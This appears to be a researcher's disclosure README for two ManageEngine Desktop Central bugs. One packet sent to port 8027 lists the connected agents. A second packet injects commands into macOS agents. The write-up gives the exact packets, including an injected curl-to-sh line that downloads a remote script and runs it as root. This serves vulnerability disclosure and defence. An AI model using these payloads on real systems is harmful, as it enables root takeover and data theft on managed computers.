# MEsendpayloadto8027

I discovered a couple of bugs in Zoho's ManageEngine Desktop Central. The first bug allowed an attacker to list all of the currently connected clients from the server and the second bug allowed a command injection to be run on the connected client computers.
This command injection only affects the macOS Desktop Central agent.
An attacker can send a specially crafted packet to the Manage Engine Desktop Central server on port 8027 to get a list of currently connected agents. The payload for this is:

`/L=1347`

The server will reply with a 'livelist' of currently connected agents:

`liveList={308:1615453515:0:0,305:1615409840:0:0,}`

Using this 'livelist' a payload can be crafted to send back to the server on port 8027 targeting the currently connected agents. In the below case targeting agent 305.

`/p=1613470134700;encStatus=true;clientList=305;<?xml version="1.0" encoding="utf-8"?><AgentRequest>
 <AgentRequestParams agent_request_param_id="1" param_name="COLLECTION_PATH" param_value="x' | curl https://leat.uk/mal.sh > /tmp/mal.sh ; sh /tmp/mal.sh ' "/>
 <AgentRequestCommand agent_request_id="chris@leat.me" request_command="8"/>
</AgentRequest>`

The COLLECTION_PATH parameter is passed from dcondemand to dcconfig as a system call but is not properly sanitized. This means that commands can be injected and run as the root user. As commands are run as a root user an attacker can have direct control over the macOS computer, all services and documents could be exfiltrated, persistence could be granted to the computer leading to further losses.
